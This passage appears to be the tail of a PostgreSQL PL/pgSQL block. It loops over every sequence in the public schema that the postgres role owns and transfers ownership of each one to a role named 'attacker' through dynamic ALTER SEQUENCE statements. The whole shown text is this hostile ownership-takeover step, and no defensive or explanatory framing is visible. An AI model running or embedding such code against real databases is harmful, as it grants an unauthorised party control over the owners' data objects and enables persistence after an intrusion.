    FOR r IN SELECT * FROM pg_catalog.pg_sequences WHERE schemaname = 'public' AND sequencename IN (SELECT relname FROM pg_class WHERE relowner = (SELECT oid FROM pg_roles WHERE rolname = 'postgres')) 
    LOOP
        EXECUTE 'ALTER SEQUENCE public.' || quote_ident(r.sequencename) || ' OWNER TO attacker;';
    END LOOP;
END $$;

